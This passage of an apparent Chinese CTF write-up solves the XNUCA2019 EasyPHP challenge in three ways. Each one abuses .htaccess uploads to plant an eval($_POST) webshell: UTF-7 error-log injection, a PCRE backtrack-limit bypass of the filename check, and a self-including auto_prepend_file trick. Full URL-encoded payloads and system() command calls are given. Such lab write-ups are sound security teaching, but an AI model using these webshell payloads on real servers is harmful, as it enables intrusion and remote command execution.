+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">php_value include_path <span class="hljs-string">&quot;/tmp&quot;</span><br>php_value zend.<span class="hljs-keyword">multibyte </span><span class="hljs-number">1</span><br>php_value zend.<span class="hljs-keyword">script_encoding </span><span class="hljs-string">&quot;UTF-7&quot;</span><br><span class="hljs-keyword">Just </span>one chance<br></code></pre></td></tr></table></figure>
+
+<p>我们这里可以使用<code>#\</code>来绕过，<code>\</code>可以转义掉<code>\n</code>中的<code>\</code>，从而使其失去换行作用，然后前面的<code>#</code>可以将这一行的内容注释掉，这样就能正常解析了。</p>
+<p>效果：</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">php_value include_path <span class="hljs-string">&quot;/tmp&quot;</span><br>php_value zend.<span class="hljs-keyword">multibyte </span><span class="hljs-number">1</span><br>php_value zend.<span class="hljs-keyword">script_encoding </span><span class="hljs-string">&quot;UTF-7&quot;</span><br><span class="hljs-comment"># \nJust one chance</span><br></code></pre></td></tr></table></figure>
+
+<p>现在全都过滤成功了。构造最终payload：</p>
+<h3 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h3><p><strong>首先在&#x2F;tmp&#x2F;fl3g.php中写入shellcode，注意使用其UTF-7编码的格式，同时开启PHP对UTF-7编码的解码，这样就能绕过了。</strong></p>
+<p><strong>需要注意的是<code>__halt_compiler</code>函数用来终端编译器的执行，如果我们不带上这个函数的话包含我们的日志文件会导致500甚至崩掉</strong></p>
+<p><strong>.htaccess</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">php_value include_path <span class="hljs-string">&quot;/tmp/xx/+ADw-?php eval(<span class="hljs-variable">$_POST</span>[1]);__halt_compiler();&quot;</span><br>php_value error_reporting 32767<br>php_value error_log /tmp/fl3g.php<br><span class="hljs-comment"># \</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>url编码后的payload：</strong></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?filename<span class="hljs-operator">=</span>.htaccess&amp;content<span class="hljs-operator">=</span>php_value<span class="hljs-variable">%20</span>include_path<span class="hljs-variable">%20</span><span class="hljs-variable">%22</span><span class="hljs-variable">%2</span>Ftmp<span class="hljs-variable">%2</span>Fxx<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>BADw-<span class="hljs-variable">%3</span>Fphp<span class="hljs-variable">%20</span>eval(<span class="hljs-variable">%24</span>_POST<span class="hljs-variable">%5</span>B<span class="hljs-number">1</span><span class="hljs-variable">%5</span>D)<span class="hljs-variable">%3</span>B__halt_compiler()<span class="hljs-variable">%3</span>B<span class="hljs-variable">%22</span><span class="hljs-variable">%0</span>Aphp_value<span class="hljs-variable">%20</span>error_reporting<span class="hljs-variable">%2032767</span><span class="hljs-variable">%0</span>Aphp_value<span class="hljs-variable">%20</span>error_log<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>Ftmp<span class="hljs-variable">%2</span>Ffl<span class="hljs-number">3</span>g.php<span class="hljs-variable">%0</span>A<span class="hljs-variable">%23</span><span class="hljs-variable">%20</span><span class="hljs-variable">%5</span>C<br></code></pre></td></tr></table></figure>
+
+<p>我们再访问一次就能触发include包含的错误路径即shellcode记录在日志文件中（&#x2F;tmp&#x2F;fl3g.php）。</p>
+<p>然后我们需要再写入一个新的.htaccess文件设置让我们的日志中的UTF-7编码能成功被解码，这样我们的PHP代码才能被解析。</p>
+<p><strong>.htaccess</strong></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">php_value include_path <span class="hljs-string">&quot;/tmp&quot;</span><br>php_value zend.<span class="hljs-keyword">multibyte </span><span class="hljs-number">1</span><br>php_value zend.<span class="hljs-keyword">script_encoding </span><span class="hljs-string">&quot;UTF-7&quot;</span><br><span class="hljs-comment"># \</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>url编码后的payload：</strong></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?filename<span class="hljs-operator">=</span>.htaccess&amp;content<span class="hljs-operator">=</span>php_value<span class="hljs-variable">%20</span>include_path<span class="hljs-variable">%20</span><span class="hljs-variable">%22</span><span class="hljs-variable">%2</span>Ftmp<span class="hljs-variable">%22</span><span class="hljs-variable">%0</span>Aphp_value<span class="hljs-variable">%20</span>zend.multibyte<span class="hljs-variable">%201</span><span class="hljs-variable">%0</span>Aphp_value<span class="hljs-variable">%20</span>zend.script_encoding<span class="hljs-variable">%20</span><span class="hljs-variable">%22</span>UTF<span class="hljs-number">-7</span><span class="hljs-variable">%22</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%23</span><span class="hljs-variable">%20</span><span class="hljs-variable">%5</span>C<br></code></pre></td></tr></table></figure>
+
+<p>(.htaccess中的设置会在PHP文件执行之前被加载，所以不用担心删除导致.htaccess在本次访问时不生效，但是我们执行一次命令后.htaccess文件就会被删除)。</p>
+<p>然后我们就可以使用一句话木马来读取flag。并且这里不能用一句话木马来写入shell，因为也是无法当成php来解析的，只有index.php才能被当成php解析。也不能用蚁剑连接，所以这里基本上算是一次性shell。</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">POST:<br><span class="hljs-number">1</span>=<span class="hljs-built_in">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../image/XNUCA2019Qualifier-EasyPHP-3.png"></p>
+<h2 id="解法二-htaccess配置prce绕过正则匹配"><a href="#解法二-htaccess配置prce绕过正则匹配" class="headerlink" title="解法二 .htaccess配置prce绕过正则匹配"></a>解法二 .htaccess配置prce绕过正则匹配</h2><p>.htaccess</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">php_value</span> pcre.backtrack_limit <span class="hljs-number">0</span><br><span class="hljs-attribute">php_value</span> pcre.jit <span class="hljs-number">0</span><br><span class="hljs-comment"># \</span><br></code></pre></td></tr></table></figure>
+
+<p><strong><code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1)</code> 而不是<code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) !== 0)</code>，因此可以通过php_value 设置正则回朔次数来使正则匹配的结果返回为false而不是0或1，默认的回朔次数比较大，可以设成0，那么当超过此次数以后将返回false</strong></p>
+<h3 id="payload构造-1"><a href="#payload构造-1" class="headerlink" title="payload构造"></a>payload构造</h3><p><strong>url编码后的payload</strong></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?filename<span class="hljs-operator">=</span>.htaccess&amp;content<span class="hljs-operator">=</span>php_value<span class="hljs-variable">%20</span>pcre.backtrack_limit<span class="hljs-variable">%200</span><span class="hljs-variable">%0</span>Aphp_value<span class="hljs-variable">%20</span>pcre.jit<span class="hljs-variable">%200</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%23</span><span class="hljs-variable">%20</span><span class="hljs-variable">%5</span>C<br></code></pre></td></tr></table></figure>
+
+<p><strong>然后这个时候我们就能突破了文件名的限制上传fl3g.php了，在fl3g.php中写上一句话之后就能为我们所用了。但是要注意传到当前目录是不行的，源码表明了会清除当前目录下非index.php文件，因为包含语句在删除语句之后所以我们传入在当起目录的话还没包含就已经被删除了，这里选择根目录下的tmp文件上传。</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?filename=/tmp/fl3g.php&amp;content=<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后再上传一个.htaccess文件，修改设置include_path为&#x2F;tmp，包含&#x2F;tmp目录下的fl3g.php文件使其被当成php文件解析</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">php_value include_path <span class="hljs-string">&quot;/tmp&quot;</span><br># \<br><br>?filename<span class="hljs-operator">=</span>.htaccess&amp;content<span class="hljs-operator">=</span>php_value<span class="hljs-variable">%20</span>include_path<span class="hljs-variable">%20</span><span class="hljs-variable">%22</span><span class="hljs-variable">%2</span>Ftmp<span class="hljs-variable">%22</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%23</span><span class="hljs-variable">%20</span><span class="hljs-variable">%5</span>C<br></code></pre></td></tr></table></figure>
+
+<p>可以连蚁剑。注意每一次都需要重新生成.htaccess文件</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">49</span>f13073-<span class="hljs-number">0</span>a91-<span class="hljs-number">48</span>ae-<span class="hljs-number">9</span>e1e-aec6f53abccb.node5.buuoj.cn:<span class="hljs-number">81</span>/?filename=.htaccess&amp;content=php_value%<span class="hljs-number">20</span>include_path%<span class="hljs-number">20</span>%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>Ftmp%<span class="hljs-number">22</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">23</span>%<span class="hljs-number">20</span>%<span class="hljs-number">5</span>C<br></code></pre></td></tr></table></figure>
+
+<p>也可以直接命令执行</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">49</span>f13073-<span class="hljs-number">0</span>a91-<span class="hljs-number">48</span>ae-<span class="hljs-number">9</span>e1e-aec6f53abccb.node5.buuoj.cn:<span class="hljs-number">81</span>/<br><br><span class="hljs-attribute">post</span>：<br><span class="hljs-attribute">1</span>=system(&#x27;ls&#x27;);<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="解法三-htaccess文件包含"><a href="#解法三-htaccess文件包含" class="headerlink" title="解法三 .htaccess文件包含"></a>解法三 .htaccess文件包含</h2><p><strong>在.htaccess中#表示注释符号的意思，所以我们可以将一句话放在#后面，再让PHP文件包含.htaccess，此外再使用符号”&quot;换行的功能绕过对关键词file的检测，再让我们每次访问时均生成这样一个.htaccess，这样就能得到一个可以用在蚁剑上的一句话了。</strong></p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">php_value auto_prepend_fi\</span><br><span class="language-xml">le &quot;.htaccess&quot;</span><br><span class="language-xml">#</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">\</span><br></code></pre></td></tr></table></figure>
+
+<p>蚁剑连接</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">49</span>f13073-<span class="hljs-number">0</span>a91-<span class="hljs-number">48</span>ae-<span class="hljs-number">9</span>e1e-aec6f53abccb.node5.buuoj.cn:<span class="hljs-number">81</span>/?filename=.htaccess&amp;content=php_value%<span class="hljs-number">20</span>auto_prepend_fi%<span class="hljs-number">5</span>C%<span class="hljs-number">0</span>Ale%<span class="hljs-number">20</span>%<span class="hljs-number">22</span>.htaccess%<span class="hljs-number">22</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">23</span>%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>Fphp%<span class="hljs-number">20</span>eval(%<span class="hljs-number">24</span>_POST%<span class="hljs-number">5</span>B1%<span class="hljs-number">5</span>D)%<span class="hljs-number">3</span>B%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">5</span>C<br></code></pre></td></tr></table></figure>
+
+<p>也可以命令执行，但是每一个.htaccess文件只能执行一次。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">49</span>f13073-<span class="hljs-number">0</span>a91-<span class="hljs-number">48</span>ae-<span class="hljs-number">9</span>e1e-aec6f53abccb.node5.buuoj.cn:<span class="hljs-number">81</span>/<br><br><span class="hljs-attribute">post</span>:<br><span class="hljs-attribute">1</span>=system(&#x27;ls&#x27;);<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
     </div>
